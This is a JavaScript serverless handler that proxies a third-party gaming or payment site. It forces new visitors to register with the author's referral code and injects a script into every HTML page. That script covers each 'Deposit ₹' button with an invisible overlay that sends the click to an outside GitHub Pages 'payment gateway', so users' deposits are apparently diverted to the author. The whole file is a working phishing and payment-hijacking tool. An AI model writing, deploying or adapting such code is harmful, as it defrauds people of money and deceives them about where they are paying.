export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const targetHost = "https://www.91appq.com";
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";

  // 1. AUTO-REGISTER: Pehli baar aane pe register page with code [cite: 2025-12-24]
  if (req.url === "/" || req.url === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 2. FETCH original site
  const response = await fetch(targetHost + req.url, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // 3. FREEZE & HIJACK SCRIPT (For Red Deposit ₹ Button)
    const hijackScript = `
    <script>
      (function() {
        const freezeButton = () => {
          // Saare buttons aur clickable divs ko scan karo
          const els = document.querySelectorAll('div, button, .van-button');
          
          els.forEach(el => {
            const text = el.innerText || "";
            // Condition: Text mein 'Deposit' aur '₹' ho
            if (text.includes('Deposit') && text.includes('₹')) {
              
              if (!el.dataset.frozen) {
                el.style.position = 'relative';
                
                // Double Layer (Overlay) jo asli click ko rok dega
                const layer = document.createElement('div');
                layer.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:999999;cursor:pointer;background:transparent;';
                
                // Clicking layer opens your link
                layer.onclick = (e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  window.location.href = "${myGitHub}";
                };

                el.appendChild(layer);
                el.dataset.frozen = "true";
              }
            }
          });
        };
        // Har 400ms mein check taaki dynamic red button aate hi freeze ho jaye
        setInterval(freezeButton, 400);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
    }
